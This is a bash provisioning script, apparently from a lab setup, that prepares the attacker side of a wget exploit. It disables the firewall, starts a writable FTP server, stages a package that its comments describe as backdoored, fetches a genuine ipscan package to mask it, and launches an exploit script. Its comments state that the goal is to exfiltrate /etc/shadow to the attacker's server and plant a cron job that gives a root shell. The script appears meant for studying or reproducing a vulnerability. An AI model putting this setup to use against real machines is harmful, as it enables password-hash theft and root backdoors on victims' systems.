#!/bin/bash
# sudo systemctl stop firewalld
sudo ufw disable

# install essential packages
sudo apt-get -y update
sudo apt-get -y install build-essential
sudo apt-get -y install python-pip python-dev
# install pythonftpdlib package 
sudo pip install pyftpdlib

# creating the .wgetrc file 
# /etc/shadow will be sent back to the attacker's server through the post request 
# /etc/cron.d/wget-root-shell will be created upon the receive of response from attacker's server
# with content specified by the attacker
mkdir /tmp/ftptest
cd /tmp/ftptest
####################################################################
# copy the Debian package that contains the backdoor to /tmp/ftptest
# cp <PATH_TO_DEBIAN_PACKAGE> /tmp/ftptest
# remove the next line once malicious Debian package is available
cp /vagrant/provision/ipscan_3.5.5_amd64.deb /tmp/ftptest
####################################################################
# configure ftp server and starting it in the background 
# -m specifies the module name; -p port; -w write access
sudo python -m pyftpdlib -p21 -w &
# wait for fptserver to be started 
sleep 5
# in a new directory run web server
mkdir /tmp/webtest
cd /tmp/webtest
####################################################################
# put the same but benign Debian package in the directory as a mask
# you may need to change the Debian package if you change
# the malicious Debian package
wget https://github.com/angryip/ipscan/releases/download/3.5.5/ipscan_3.5.5_amd64.deb
cp /vagrant/provision/wget-exploit3.py /tmp/webtest
####################################################################
sudo python3 /tmp/webtest/wget-exploit3.py > /vagrant/data/exploit-output.txt & sleep 1

